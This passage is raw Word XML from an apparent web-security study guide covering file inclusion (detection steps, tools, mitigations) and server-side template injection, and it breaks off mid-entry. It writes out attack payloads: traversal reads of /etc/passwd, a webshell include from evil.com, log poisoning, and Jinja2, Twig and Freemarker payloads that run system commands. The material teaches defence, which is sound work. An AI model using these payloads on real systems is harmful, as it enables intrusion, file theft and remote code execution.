    <w:p w14:paraId="2A635530" w14:textId="06C1E335" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Session Poisoning: include session file with attacker input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC7E60F" w14:textId="17303DFB" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="213" w:name="_Toc208408684"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="213"/>
    </w:p>
    <w:p w14:paraId="72D19C32" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>1. Identify file parameters (?page=, ?file=, ?template=).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6226B1" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>2. Test directory traversal (../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, ../../boot.ini).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46735028" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>3. Check for wrappers (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>://filter, data://).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D6F21C" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>4. Try remote includes if enabled (?file=http://attacker/shell.txt).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6113055F" w14:textId="77777777" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="0065570D">
      <w:r>
        <w:t>5. Look for error messages like include(): failed to open stream.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C1E840" w14:textId="45CCF0B7" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="00F93AFC">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="214" w:name="_Toc208408685"/>
      <w:r>
        <w:t>Payload Examples</w:t>
      </w:r>
      <w:bookmarkEnd w:id="214"/>
    </w:p>
    <w:p w14:paraId="76F7B7D0" w14:textId="1AB36037" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>LFI File Read: ../../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="18539B3B" w14:textId="77BC825D" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Windows LFI: ../../../../windows/system32/drivers/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A76D2DD" w14:textId="3151BE90" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">LFI with Wrapper: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>://filter/convert.base64-encode/resource=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1B845D7A" w14:textId="3A105DE2" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">RFI </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r w:rsidRPr="00C954B2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://evil.com/shell.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4002C818" w14:textId="72773679" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Session Poisoning: /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/sess_123abc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C31217" w14:textId="372ABB75" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Log Poisoning: include ../../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/log/apache2/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>access.log&amp;cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6799E03C" w14:textId="44602AA6" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="215" w:name="_Toc208408686"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="215"/>
    </w:p>
    <w:p w14:paraId="153C3C82" w14:textId="6F6AA8EE" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite (parameter fuzzing)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EA117B" w14:textId="70635906" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">LFI Suite / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>LFISploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (automated LFI exploitation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AD75C0" w14:textId="0BA5D910" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>FuzzDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> wordlists (common file paths)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218B06F7" w14:textId="5C49393E" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Wfuzz</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (file inclusion discovery)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D96FEC1" w14:textId="0BBA31F8" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="216" w:name="_Toc208408687"/>
      <w:r>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="216"/>
    </w:p>
    <w:p w14:paraId="54B827D3" w14:textId="72227681" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Never include files based on raw user input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DCB147" w14:textId="33C55CBB" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Whitelist allowed templates/pages.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2889D2A7" w14:textId="4715B6BD" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Disable risky PHP settings: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>allow_url_include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">=Off, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>allow_url_fopen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=Off.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A630CAF" w14:textId="615BFAD3" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Validate paths with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>realpath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>() and disallow ‘../’.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EA825F" w14:textId="3DF8C6AA" w:rsidR="0065570D" w:rsidRDefault="0065570D" w:rsidP="003E0CB1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Restrict file permissions, isolate </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>webroot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447398A4" w14:textId="03A3FB9C" w:rsidR="00FD1A0B" w:rsidRDefault="00FD3821" w:rsidP="00FD3821">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Server Side Template Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B397A2" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t xml:space="preserve">Server-Side Template Injection (SSTI) occurs when user input is embedded unsafely into a server-side template engine expression. Template engines (Jinja2, Twig, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Freemarker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, Velocity, Smarty, Handlebars, etc.) allow developers to generate dynamic HTML. If user input is concatenated into template code, attackers can inject expressions interpreted by the engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CCE358" w14:textId="3F7BBA43" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00FD3821">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Examples of Vulnerable Templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3A5101" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00FD3821">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Jinja2 (Python, Flask/Django):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54426962" w14:textId="2797CD9D" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00742334">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Vulnerable: return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>render_template_string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(‘Hello ‘ + name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D1B32A" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00742334">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload: ?name={{7*7}} → Output: 49</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D30E94" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00742334">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Twig (PHP, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Symfony</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E2FFB5" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00742334">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Template: {{ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user.name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6778A894" w14:textId="5ECC28C6" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00742334">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload: {{7*’7’}} → Output: 7777777</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE83033" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="004F78C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Freemarker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (Java, Spring):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588DE6B9" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="004F78C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Template: ${</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user.name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D92B03" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="004F78C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="42"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Payload: ${7*7} → Output: 49</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6453E9D4" w14:textId="395BC0A3" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="004F78C1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023E5EC2" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>1. Identify template syntax: {{ }}, ${ }, {% %} depending on engine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC5EBCE" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t xml:space="preserve">2. Insert test payloads: {{7*7}}, ${7*7}, {% if 7*7==49 %}OK{% </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>endif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> %}.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32044227" w14:textId="77777777" w:rsidR="004F78C1" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>3. Confirm execution: if arithmetic evaluates, SSTI is present.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57ED36AC" w14:textId="5E72849D" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="004F78C1">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42574F42" w14:textId="228DF090" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00E06105">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Simple Arithmetic Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A886A99" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>Payload: {{7*7}} → Confirms code execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6E3E55" w14:textId="14E3AD60" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00E06105">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Information Disclosure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765A190B" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>Access variables/environment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797FB6D9" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Jinja2: {{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}}, {{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>request.args</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3396ACC7" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Freemarker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: ${.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>systemProperties</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="366F1134" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Twig: {{_self}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF3D998" w14:textId="4770144F" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00E06105">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Sandbox Escape</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEF9706" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>Bypass restrictions using object traversal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7881B637" w14:textId="12C277D8" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>Example (Jinja2): {{ ‘’.__class__.__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>__[2].__subclasses__() }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2338518C" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t xml:space="preserve">→ Enumerate classes; then use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>os.popen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> for commands.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429D1B2F" w14:textId="536F6D18" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="00E06105">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2028C42D" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>Examples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FAAD9D" w14:textId="0A2B12CD" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Jinja2: {{ cycler.__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>init</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>__.__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>globals</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>__.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>os.popen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(‘id’).read() }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E353DF" w14:textId="72EF1A6A" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>- Twig: {{_self.env.registerUndefinedFilterCallback(‘exec’)}}{{_self.env.getFilter(‘id’)}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51158B2C" w14:textId="50EC5805" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Freemarker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: ${“</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>freemarker.template.utility.Execute”?new</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()(“id”)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4288E5CF" w14:textId="524E0EFF" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0052226B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Common Payloads </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E51356" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>{{7*7}} → check evaluation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27239B9E" w14:textId="0F8229C9" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>{{7*’7’}} → string multiplication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C15B9EB" w14:textId="11F8EBE3" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>{{‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>a’.upper</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()}} → method call test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088A24B9" w14:textId="77777777" w:rsidR="00FD1A0B" w:rsidRDefault="00FD1A0B" w:rsidP="0065570D">
      <w:r>
        <w:t>{{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config.items</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">()}} (Jinja2) → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>config</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
